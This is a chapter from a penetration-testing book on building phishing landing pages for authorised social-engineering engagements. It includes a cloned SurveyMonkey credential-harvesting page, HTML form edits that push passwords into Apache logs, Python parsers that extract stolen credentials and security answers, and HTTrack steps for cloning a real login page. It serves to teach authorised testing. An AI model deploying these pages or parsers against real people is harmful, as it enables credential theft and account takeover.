<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 8: Cloning a Landing Page</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:5e8bb34b-260b-4fef-91f3-caabb4446e65" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_107" title="107"/>8</span><br/>
<span class="ChapterTitle">Cloning a Landing Page</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">Victims who click a link in your phishing email should land on a believable web page. If your attack reaches this stage, creating a useful and realistic landing page becomes the most important aspect of the engagement. Depending on the level of difficulty requested by the client, this could range from Myspace-level HTML to a nearly identical clone of a site the employee goes to daily. </p>
<p>In this chapter, we’ll walk through a cloned website to show you what kind of changes you’ll have to make to the original site. Then we’ll clone two web pages from the No Starch Press website by using HTTrack, a Linux command line tool. You could host these cloned pages on the Apache server you set up in <span class="xref" itemid="xref_target_Chapter 7">Chapter 7</span>, and then link to this site in the email you send to your client’s employees.</p>
<h2 id="h1-500983c08-0001"><span epub:type="pagebreak" id="Page_108" title="108"/>An Example of a Cloned Website</h2>
<p class="BodyFirst">Let’s take a look at a fake SurveyMonkey site, which I cloned around 2017. This simple site has three pages. First, it prompts victims to fill in a login form. Once victims click the Submit button, they’re taken to a password-reset form, which asks some invasive questions. The final page tells the user that an error has occurred while resetting their account. Let’s explore these pages in greater depth so you can better understand this architecture. </p>
<h3 id="h2-500983c08-0001">The Login Page</h3>
<p class="BodyFirst"><a href="#figure8-1" id="figureanchor8-1">Figure 8-1</a> shows the first page, named <em>index.html</em>.</p>
<figure>
<img alt="&lt;&lt;Login page of the cloned SurveyMonkey site with the SurveyMonkey logo circled in red and a callout reading “A target company’s logo can be included for additional realism.”&gt;&gt;" class="" src="image_fi/500983c08/f08001.png"/>
<figcaption><p><a id="figure8-1">Figure 8-1</a>: The first page of the cloned site (<em>i</em><em>ndex.html</em>)</p></figcaption>
</figure>
<p>Visually, a victim could pick up on a few cues to identify this phish. Notice that it lacks the green padlock indicating the use of HTTPS, because I rendered it directly from the file into my browser without using Apache. In a real phish, the URL wouldn’t have the legitimate format <em>surveymonkey.com/&lt;path to survey&gt; </em>, though it might mention SurveyMonkey somewhere to fool users. Also, SurveyMonkey doesn’t typically put logos on the login page. Otherwise, it’s hard to detect this phish; the title shown on the browser tab is accurate, and hovering over the Sign Up or BBB Accredited Business links will show the real links. </p>
<p><a href="#figure8-2" id="figureanchor8-2">Figure 8-2</a> shows us the first page (<em>index.html</em>) of our site, which we connected to using HTTPS without error. This is the initial page we would send victims to and where we will attempt to harvest the email addresses and passwords of victims before passing them to the <em>questions.html</em> page. </p>
<span epub:type="pagebreak" id="Page_109" title="109"/><figure>
<img alt="&lt;&lt;HTTPS version of cloned SurveyMonkey site shows URL (practicalsocialengineering.com.cgi-bin.life). Left, username and password fields with log in button. Right, buttons for logging in using Google, Facebook, Office 365, and LinkedIn.&gt;&gt;" class="keyline" src="image_fi/500983c08/f08002.png"/>
<figcaption><p><a id="figure8-2">Figure 8-2</a>: HTTPS version of the site (showing a clear security rating)</p></figcaption>
</figure>
<p>If you review the HTML source code for this page, you’ll see that it’s almost identical to the code from the original site. You can find the source code for the pages that we cloned, as well as parsers written in Python for the information that may be input, at <a class="LinkURL" href="http://sm-phish.seosint.xyz/">http://sm-phish.seosint.xyz/</a>. </p>
<p>In <em>index.html</em>, I’ve altered the lines of code that define the login form and its fields. I’ve also edited the code so that when users submit the form, they get redirected to <em>questions.html</em>: </p>
<pre><code>&lt;form id="sign_in_form" class="sign-in-form" <span aria-label="annotation1" class="CodeAnnotationCode">1</span>action="Questions.html" enctype="application/x-www-form-urlencoded" <span aria-label="annotation2" class="CodeAnnotationCode">2</span>"method=get"&gt;
&lt;fieldset form="sign_in_form"&gt; &lt;label for="username"&gt;Enter
your username:&lt;/label&gt; 
&lt;<span aria-label="annotation3" class="CodeAnnotation">3</span>input id="username" name="username" value="" autocorrect="off" autocapitalize="off" class="notranslate <span aria-label="annotation4" class="CodeAnnotationCode">4</span>textfield required" maxlength="50" size="20" autofocus="" <span aria-label="annotation5" class="CodeAnnotationCode">5</span>type="text"&gt;
&lt;span&gt;&lt;/span&gt; 
&lt;label for="password"&gt;Enter
your password:&lt;/label&gt; 
&lt;<span aria-label="annotation6" class="CodeAnnotation">6</span>input id="password" name="password" class="notranslate textfield required" size="20" autocomplete="off" type="password"&gt;
&lt;span&gt;&lt;/span&gt;
&lt;div&gt; 
&lt;input id="remember_me" name="remember_me" type="checkbox"&gt; 
&lt;label class="remember-me" for="remember_me"&gt;Remember me!&lt;/label&gt;
&lt;/div&gt;
&amp;nbsp;&lt;a href="Questions.html"&gt;
&lt;button class="translate btn btn-large btn-arrow btn-arrow-right btn-arrow-large-horiz btn-arrow-large-right-dark yellow shadow" type="submit"&gt;Sign In &lt;span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/a&gt;</code></pre>
<p><span epub:type="pagebreak" id="Page_110" title="110"/>I defined the <code>action</code> <span aria-label="annotation1" class="CodeAnnotation">1</span> to tell the system that it should move to the <em>questions.html</em> page after the user submits the form. Next, I defined the HTTP method as <code>get</code> <span aria-label="annotation2" class="CodeAnnotation">2</span> to capture data from each of the form’s fields. (A full explanation of HTTP methods is outside the scope of this book, but you can find many resources covering the topic online.) I then created the <code>input-id</code> <span aria-label="annotation3" class="CodeAnnotation">3</span>, <code>textfield required</code> <span aria-label="annotation4" class="CodeAnnotation">4</span>, and <code>type</code> <span aria-label="annotation5" class="CodeAnnotation">5</span> fields, which generate the boxes that will display onscreen for the victim to use.</p>
<p>You should understand that HTTP GET is not a secure method. To keep a malicious adversary outside the client’s network from exploiting it, ensure that a firewall is in place and that the only permissible IP addresses are yours and the client’s. </p>
<p>That said, using the HTTP GET method to record inputs has a variety of advantages. First, this tactic doesn’t require a backend database, because the data gets stored directly in the Apache log file, located at <em>/var/log/apache2/access.log</em>. Furthermore, if the target organization monitors its network traffic, it should receive alerts when code like the <code>password=something</code> parameter <span aria-label="annotation6" class="CodeAnnotation">6</span> occurs in cleartext, providing the organization with a clue that it’s being attacked. </p>
<p>Passing cleartext credentials in URLs or other insecure channels is a security issue. Some platforms encode this text, which isn’t secure either; even if the code used a hash as a parameter, an attacker with the ability to intercept that traffic could perform a <em>pass-the-hash attack</em>, in which an adversary steals the cryptographic representation of a password (the hash) and uses it directly to access resources without knowing the password. </p>
<p>While this form looks like a login, it’s not. It merely captures the input; it doesn’t validate it. As long as each field contains at least one character, the user will pass to the next page. If this code were actually performing authentication, it would be considered insecure, because the website would let everyone in. </p>
<p>Malicious adversaries could use these collected passwords in a variety of attacks. For example, they could attempt password spraying by trying to use a password across multiple logins associated with the employee and target. </p>
<h3 id="h2-500983c08-0002">The Sensitive Questions Page</h3>
<p class="BodyFirst"><a href="#figure8-3" id="figureanchor8-3">Figure 8-3</a> shows the second page, which asks users for sensitive information under the guise of recovering their account.</p>
<p>The <em>questions.html</em> page uses the same source code as <em>index.html</em>. Here, I replaced email addresses and password form fields with four password-reset questions. I also replaced the field that leads users to <em>questions.html</em> with <em>error.html</em>. </p>
<span epub:type="pagebreak" id="Page_111" title="111"/><figure>
<img alt="&lt;&lt;Second page of the cloned SurveyMonkey site. URL bar reads https://practicalsocialengineering.com.cgi-bin.life/Questions.html?username=test&amp;password=test and four recovery questions are displayed (including &quot;Your favorite pet's name?&quot; and &quot;The name of your elementary school?&quot;).&gt;&gt;" class="keyline" src="image_fi/500983c08/f08003.png"/>
<figcaption><p><a id="figure8-3">Figure 8-3</a>: The second page of the cloned site, with the parameters from <em>i</em><em>ndex.html </em>passed in the URL (<em>q</em><em>uestions.html</em>) </p></figcaption>
</figure>
<h3 id="h2-500983c08-0003">The Error Page</h3>
<p class="BodyFirst">The final page (<a href="#figure8-4" id="figureanchor8-4">Figure 8-4</a>) tells users there has been an error.</p>
<figure>
<img alt="&lt;&lt;Final page of the cloned SurveyMonkey site. URL bar reads https://practicalsocialengineering.com.cgi-bin.life/Error.html?pet=Dee+Oh+Gee&amp;school=School&amp;name=Mom&amp;honeymoon=Anytown%2C+USA. Page reads &quot;Oops . . . This survey is closed!&quot;&gt;&gt;" class="keyline" src="image_fi/500983c08/f08004.png"/>
<figcaption><p><a id="figure8-4">Figure 8-4</a>: The error screen for the SurveyMonkey phish</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_112" title="112"/>You could use this final page for a variety of purposes. For example, many victims may wonder why an error occurred and try the process again, entering new credentials in an attempt to make it work. Victims may also report this issue to IT, which could put an end to the engagement. </p>
<p>The HTML for this page contains an infinite loop that causes the page to reload itself forever. When I wrote this code, around 2017, browsers let this loop run forever. Versions of browsers released after 2020 may stop it after some time. </p>
<h3 id="h2-500983c08-0004">Harvesting the Information</h3>
<p class="BodyFirst">The loop causes a problem. Each iteration of it writes a line to the log file, which makes gathering passwords and other sensitive information from the file manually a challenge. Instead, you can use a couple of Python scripts to extract only relevant information. You can find these scripts at <a class="LinkURL" href="http://sm-phish.seosint.xyz/">http://sm-phish.seosint.xyz/</a>.</p>
<p>In the logs, the raw information for the “login” transaction includes the following:</p>
<pre><code><var>IP Address</var> - - [17/Feb/2021:04:04:12 +0000] "GET 
/Questions.html?username=Testing_Username&amp;password=password123 HTTP/1.1" 200 11590
"https://<var>IP Address</var>/Index.html" "Mozilla/5.0 (<var>user agent information</var>) <var>user agent information</var>)  (KHTML, like Gecko) <var>user agent information</var>) "
<var>IP Address</var> - - [17/Feb/2021:04:04:36 +0000] "GET /Error.html?pet=Dee-Oh-
Gee&amp;school=Hogwarts&amp;name=Mom&amp;honeymoon=Tatooine HTTP/1.1" 200 12090 "https://<var>IP</var>
<var>Address</var>/Questions.html?username=Testing_Username&amp;password=password123" "Mozilla/5.0 (<var>user</var>
<var>agent information</var>) <var>user agent information</var>)  (KHTML, like Gecko) <var>user agent information</var>) "</code></pre>
<p>Each line provides information a user submitted. It tells us the page on which the data was input (<em>questions.html</em> or <em>error.html</em>), as well as the field ID and value, such as <code>pet=Dee-Oh-Gee&amp;</code>.</p>
<p>The <em>data_parser_index.py</em> script will open the log file, find each field we prompted users to input on the login page, and then output the field as an array: </p>
<pre><code>#!/usr/bin/env python3

import re

user_pass = re.compile(r"\S.+username\=(?P&lt;user_name&gt;\S.+)\&amp;(?P&lt;password&gt;\S.+)\sHTTP\S.+")
log = open("/var/log/apache2/access.log", "r")
array = []

for l in log:
    u = user_pass.findall(l)
    if u:
        print(u)
    else:
        exit</code></pre>
<p><span epub:type="pagebreak" id="Page_113" title="113"/>We import Python’s regular expression module, and then create a regular expression that will parse the username and password of each line that fits the criteria in the log file. After we open the file, a <code>for</code> loop iterates across each line of the log file, displaying all matches.</p>
<p>Next, the <em>data_parser_questions.py</em> script performs the same tasks as the previous script, except it extracts the input from the <em>questions.html</em> file:</p>
<pre><code>#!/usr/bin/env python3

import re

questions = re.compile(r"\S.+pet\=(?P&lt;pet&gt;\S.+)\&amp;school\=(?P&lt;school&gt;\S.+)\&amp;name\=(?P&lt;mother&gt;\S.+)\&amp;\
honeymoon\=(?P&lt;honeymoon&gt;\S.+)\sHTTP\S.+")
log = open("/var/log/apache2/access.log", "r")
array = []

for l in log:
    u = questions.findall(l)
    if u:
        print(u)
    else:
        exit</code></pre>
<p>Once we’ve used the scripts to parse the data, we should have the information we need. The <em>data_parser_index.py</em> script yields the username and password:</p>
<pre><code>root@ossie:~# ./data_parser_index.py 
[('Testing_Username', 'password=password123')]</code></pre>
<p>The <em>data_parser_questions.py</em> script yields the password-reset questions from <em>questions.html</em>:</p>
<pre><code>root@ossie:~# ./data_parser_questions.py 
[('Dee-Oh-Gee', 'Hogwarts', 'Mom', 'Tatooine')]</code></pre>
<h2 id="h1-500983c08-0002">Cloning a Website</h2>
<p class="BodyFirst">Now you’ll clone a website. For the purpose of this exercise, you’ll create a simple, yet nearly identical copy of two No Starch Press web pages. The Apache instance you created in the preceding chapter needs some code to host. You need something to render on the user’s screen; otherwise, you’re doing nothing but measuring clicks.</p>
<h3 id="h2-500983c08-0005"><span epub:type="pagebreak" id="Page_114" title="114"/>Finding the Login and User Pages </h3>
<p class="BodyFirst">Let’s assume you’re targeting a company whose employees, as you know through your OSINT efforts, buy No Starch Press books often. To steal their credentials to the site, you’ll copy the <em>nostarch.com</em> login page. Visit this page now, or find it using <em>robots.txt</em>, a file that tells internet search-engine-index robots what to index (and what not to index). We often use this file in OSINT collection to identify directories that can’t be found using conventional search engines. </p>
<p>You may notice that clicking the Log In button takes you to a new web page: <em>https://nostarch.com/user</em>. Let’s clone both the main page and this page. </p>
<h3 id="h2-500983c08-0006">Cloning the Pages by Using HTTrack</h3>
<p class="BodyFirst">You’ll use the website-copying tool HTTrack to accomplish this cloning. This command line tool is native to Kali, and you can install it on any Linux system. For example, use the following command to install it on Ubuntu and Debian:</p>
<pre><code><b>sudo apt-get install httrack</b> </code></pre>
<p>The tool has several useful options. The <code>–mirror</code> option makes a nearly identical copy of a specific site. The <code>–update</code> option updates the copy of an existing site; for example, by changing the underlying code, links, trackers, or fields. The <code>–continue</code> option continues mirroring a site if the mirroring process was interrupted or stopped. The <code>–skeleton</code> option copies the site’s HTML files only. The <code>-O</code> option lets you specify the output directory.</p>
<p>Which operator you should use depends on the complexity of the site you plan to clone, in addition to the desired complexity of your phishing engagement. The bigger and more complex the website, the longer it takes to clone it, which increases the opportunities for that organization to catch and block you from cloning. If the client doesn’t care if you’re noisy or wants a robust copy, or if you have ample time, do the full mirroring process. Otherwise, the HTML-only option should suffice. You’ll use that option here. </p>
<p>To clone the No Starch login page, enter the following command:</p>
<pre><code><b>sudo httrack --skeleton https://nostarch.com/user/</b></code></pre>
<p><a href="#figure8-5" id="figureanchor8-5">Figure 8-5</a> shows the cloned page. You can view it from the directory from which you ran HTTrack. Navigate to the appropriate folder for the domain and then directory structure. In this case, you are looking at <em>index.html</em> from <em>nostarch.com</em>.</p>
<span epub:type="pagebreak" id="Page_115" title="115"/><figure>
<img alt="&lt;&lt;Login page of cloned No Starch site. Shows login fields for OpenID, username/email address, and password.&gt;&gt;" class="keyline" src="image_fi/500983c08/f08005.png"/>
<figcaption><p><a id="figure8-5">Figure 8-5</a>: A clone of the No Starch login page</p></figcaption>
</figure>
<p>Compare the clone to the original site (<a href="#figure8-6" id="figureanchor8-6">Figure 8-6</a>). </p>
<figure>
<img alt="&lt;&lt;Login page of real No Starch site. URL bar (https://nostarch.com/user/). Shows login fields for OpenID, username/email address, and password.&gt;&gt;" class="keyline" src="image_fi/500983c08/f08006_new.png"/>
<figcaption><p><a id="figure8-6">Figure 8-6</a>: The real No Starch login page</p></figcaption>
</figure>
<p>The only difference you should notice is the URL.</p>
<h3 id="h2-500983c08-0007"><span epub:type="pagebreak" id="Page_116" title="116"/>Altering the Login Field Code</h3>
<p class="BodyFirst">As it is right now, anything entered into the cloned site will redirect the user to the real site. You need to change that behavior for the login fields. </p>
<p>First, let’s view this code. The simplest way is to load the real site and identify the login fields in the code by using your browser’s Inspect Elements feature. To accomplish this, right-click any part of the page and select <b>Inspect</b>. Now hover over the login fields, and the code to the right should highlight these elements. </p>
<p>In this case, the login form appears. Here is the form from the original page:</p>
<pre><code>&lt;form id="sign_in_form" class="sign-in-form" action="Questions.html" enctype="application/x-www-form-urlencoded"<span aria-label="annotation1" class="CodeAnnotationCode">1</span><span class="Strikethrough">"method=post"</span>"method=get"&gt;&lt;fieldset form="sign_in_form"&gt; &lt;label for="username"&gt;Enter
your username:&lt;/label&gt; &lt;input id="username" name="username" value="" autocorrect="off" autocapitalize="off" class="notranslate textfield required" maxlength="50" size="20" autofocus="" type="text"&gt;<span aria-label="annotation2" class="CodeAnnotation">2</span>
&lt;span&gt;&lt;/span&gt; &lt;label for="password"&gt;Enter
your password:&lt;/label&gt; &lt;input id="password" name="password" class="notranslate textfield required" size="20" autocomplete="off" type="password"&gt; &lt;span&gt;&lt;/span&gt;<span aria-label="annotation3" class="CodeAnnotation">3</span>
&lt;div&gt; &lt;input id="remember_me" name="remember_me" type="checkbox"&gt; &lt;label class="remember-me" for="remember_me"&gt;Remember me!&lt;/label&gt; &lt;/div&gt;
&amp;nbsp;&lt;a href="Questions.html"&gt;&lt;button class="translate btn btn-large btn-arrow btn-arrow-right btn-arrow-large-horiz btn-arrow-large-right-dark yellow shadow" type="submit"&gt;Sign In &lt;span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/a&gt;
&lt;/fieldset&gt;
&lt;/form&gt;</code></pre>
<p>Like the login form we discussed earlier, this file contains username <span aria-label="annotation2" class="CodeAnnotation">2</span> and password <span aria-label="annotation3" class="CodeAnnotation">3</span> fields, and the capture works the same way.</p>
<p>Upon further inspection, you can see that this site uses the HTTP POST method instead of GET, which means you will need to rewrite that line <span aria-label="annotation1" class="CodeAnnotation">1</span> so you can steal credentials in the URL, thus writing them to the Apache Access log. HTTP POST and HTTP GET are both methods to get information from the server to the client. The main difference is that the GET method carries the parameters in the URL, which is less secure than the HTTP POST methods, which use the body of the message to transfer the parameters.</p>
<p>Let’s apply this to our No Starch login and make some changes so that you can change the type to GET and capture the credentials as planned. The file you are looking for is under the <em>nostarch.com/user </em>directory in <em>index.html</em>. You can find the file by using the Inspect Element method or manually downloading and reviewing the source code. </p>
<p>Here is the part from the existing code that has the form (which can be found by searching for the word <em>form</em>):</p>
<pre><code>&lt;form action="https://nostarch.com/user/" method="post" id="user-login" accept-
charset="UTF-8"&gt;&lt;div&gt;&lt;div class="form-item form-item-openid-identifier form-type-textfield
form-group"&gt; &lt;label class="control-label" for="edit-openid-identifier"&gt;Log in using
OpenID&lt;/label&gt;
<span epub:type="pagebreak" id="Page_117" title="117"/>&lt;input class="form-control form-text" type="text" id="edit-openid-identifier"
name="openid_identifier" value="" size="60" maxlength="255" /&gt;&lt;div class="help-block"&gt;&lt;a
href="https://openid.net/"&gt;What is OpenID?&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="form-item form-item-
name form-type-textfield form-group"&gt; &lt;label class="control-label" for="edit-name"&gt;Username
or email address &lt;span class="form-required" title="This field is
required."&gt;*&lt;/span&gt;&lt;/label&gt;
&lt;input class="form-control form-text required" title="Enter your username or email
address." data-toggle="tooltip" type="text" id="edit-name" name="name" value="" size="60"
maxlength="60" /&gt;&lt;/div&gt;&lt;div class="form-item form-item-pass form-type-password form-group"&gt;
&lt;label class="control-label" for="edit-pass"&gt;Password &lt;span class="form-required"
title="This field is required."&gt;*&lt;/span&gt;&lt;/label&gt;
&lt;input class="form-control form-text required" title="Enter the password that accompanies
your username." data-toggle="tooltip" type="password" id="edit-pass" name="pass" size="60"
maxlength="128" /&gt;&lt;/div&gt;&lt;input type="hidden" name="form_build_id" value="form--q4hdYs-
iZQz_R7O2aCls66if7f2BqLo2k1ZftdGkfs" /&gt;
&lt;input type="hidden" name="form_id" value="user_login" /&gt;
&lt;input type="hidden" name="openid.return_to"
value="https://nostarch.com/openid/authenticate?destination=user" /&gt;
&lt;ul class="openid-links"&gt;&lt;li class="openid-link"&gt;&lt;a href="#openid-login"&gt;Log in using
OpenID&lt;/a&gt;&lt;/li&gt;
&lt;li class="user-link"&gt;&lt;a href="#"&gt;Cancel OpenID login&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class="form-actions form-wrapper form-group" id="edit-actions"&gt;&lt;button
type="submit" id="edit-submit" name="op" value="Log in" class="btn btn-primary form-submit
icon-before"&gt;&lt;span class="icon glyphicon glyphicon-log-in" aria-hidden="true"&gt;&lt;/span&gt;
Log in&lt;/button&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/form&gt;</code></pre>
<p>Now, make the changes shown in bold:</p>
<pre><code><span aria-label="annotation1" class="CodeAnnotationCode">1</span><b>&lt;form action="Error.html" method="get" </b>id="user-login" accept-charset="UTF-8"&gt;&lt;div&gt;
&lt;div class="form-item form-item-openid-identifier form-type-textfield form-group"&gt; 
&lt;label class="control-label" for="edit-openid-identifier"&gt;Log in using OpenID&lt;/label&gt;
&lt;input class="form-control form-text" type="text" id="edit-openid-identifier"
name="openid_identifier" value="" size="60" maxlength="255" /&gt;
&lt;div class="help-block"&gt;
&lt;a <span aria-label="annotation2" class="CodeAnnotationCode">2</span><b>href="Error.html"</b>&gt;What is OpenID?&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="form-item form-item-name form-type-textfield form-group"&gt; 
&lt;label class="control-label" for="edit-name"&gt;Username or email address &lt;span class="form-required" title="This field is required."&gt;*&lt;/span&gt;&lt;/label&gt;
&lt;input class="form-control form-text required" title="Enter your username or email
address." data-toggle="tooltip" type="text" id="edit-name" name="name" value="" size="60"
maxlength="60" /&gt;
&lt;/div&gt;
&lt;div class="form-item form-item-pass form-type-password form-group"&gt; 
&lt;label class="control-label" for="edit-pass"&gt;Password &lt;span class="form-required" title="This field is required."&gt;*&lt;/span&gt;&lt;/label&gt;
&lt;input class="form-control form-text required" title="Enter the password that accompanies
your username." data-toggle="tooltip" type="password" id="edit-pass" name="pass" size="60"
maxlength="128" /&gt;
&lt;/div&gt;<span aria-label="annotation3" class="CodeAnnotation">3</span><span class="Strikethrough">&lt;input type="hidden" name="form_build_id" value="form--q4hdYs-iZQz_R7O2aCls66if7f2BqLo2k1ZftdGkfs" /&gt;</span>
&lt;input type="hidden" name="form_id" value="user_login" /&gt;
&lt;input type="hidden" name="openid.return_to" value="Error.html"/&gt;
&lt;ul class="openid-links"&gt;&lt;li class="openid-link"&gt;&lt;a href="#openid-login"&gt;Log in using
<span epub:type="pagebreak" id="Page_118" title="118"/>OpenID&lt;/a&gt;&lt;/li&gt;
&lt;li class="user-link"&gt;&lt;a href="#"&gt;Cancel OpenID login&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class="form-actions form-wrapper form-group" id="edit-actions"&gt;
&lt;button type="submit" id="edit-submit" name="op" value="Log in" class="btn btn-primary
form-submit icon-before"&gt;
&lt;span class="icon glyphicon glyphicon-log-in" aria-hidden="true"&gt;&lt;/span&gt;Log in&lt;/button&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/form&gt;</code></pre>
<p>You first alter the <code>form action</code> <span aria-label="annotation1" class="CodeAnnotation">1</span> and the <code>href</code> tag <span aria-label="annotation2" class="CodeAnnotation">2</span>, which allow us to redirect traffic from this page to our <em>error.html</em> file. At <span aria-label="annotation3" class="CodeAnnotation">3</span> you can see the part of the code that you need to remove so that your fake page does not redirect the victim to the real page. </p>
<p>You’ll have to make your own version of the <em>error.html</em> file referenced in this file, but this isn’t hard to do. You could do something as simple as copying the existing file and replacing the form with a statement that says something like this line:</p>
<pre><code>&lt;h5&gt; Sorry, but our site is down for maintenance. Please check back in 24 
hours. We are sorry for any inconveniences this may cause.&lt;/h5&gt;</code></pre>
<p>You can find a sample <em>error.html</em> file for a SurveyMonkey page in the GitHub repository (<a class="LinkURL" href="http://sm-phish.seosint.xyz/">http://sm-phish.seosint.xyz/</a>). </p>
<p>Now test this copy by double-clicking the icon in a file viewer or navigating to the host in a browser (<a href="#figure8-7" id="figureanchor8-7">Figure 8-7</a>). </p>
<figure>
<img alt="&lt;&lt;“My Account” page of cloned No Starch site. Shows &quot;Log in&quot; tab with error message &quot;Sorry, but our site is down for maintenance. Please check back in 24 hours. We are sorry for any inconveniences this may cause&quot;.&gt;&gt;" class="keyline" src="image_fi/500983c08/f08007.png"/>
<figcaption><p><a id="figure8-7">Figure 8-7</a>: Displaying a custom error message on a clone of No Starch’s registration page</p></figcaption>
</figure>
<h3 id="h2-500983c08-0008"><span epub:type="pagebreak" id="Page_119" title="119"/>Adding the Web Pages to the Apache Server</h3>
<p class="BodyFirst">Once you can confirm that it works, move your site to Apache’s root directory. This will be where we have the SSL/TLS certificate installed and DNS pointing to. To accomplish this, you will need to move each HTML file to <em>/var/www/public_html</em>. Any connections to the sites will be recorded in <em>Access.log</em>, and that is where you’ll collect the data provided by victims.</p>
<p>Here is the <em>Access.log</em> for this event:</p>
<pre><code><var>IP Address</var> - - [17/Feb/2020:04:04:12 +0000] "GET
/error.html?openid_identifier=test&amp;name=test&amp;pass=test HTTP/1.1" 200 11590 "https://<var>IP</var>
<var>Address</var>/index.html" "Mozilla/5.0 (<var>user agent information</var>) <var>user agent information</var>) 
(KHTML, like Gecko) <var>user agent information</var>) "</code></pre>
<h2 id="h1-500983c08-0003">Conclusion</h2>
<p class="BodyFirst">Setting up phishing pages is not terribly hard. It can be tedious, though, and will determine your success. The quality of your phishing landing pages can make the difference between a wildly unsuccessful phish, even against a company lacking security awareness, and repeat business through a collaborative relationship. </p>
<p>Another thing to keep in mind is that the pages should be only as realistic as your client wants. If they want this exercise to be a 3 out of 10, you may leave off the HTTPS support, include broken links, or use poor grammar. If they ask for a 9, throw everything and the kitchen sink at them. Be the best nation-state social engineer that you can be!</p>
</section>
</body>
</html>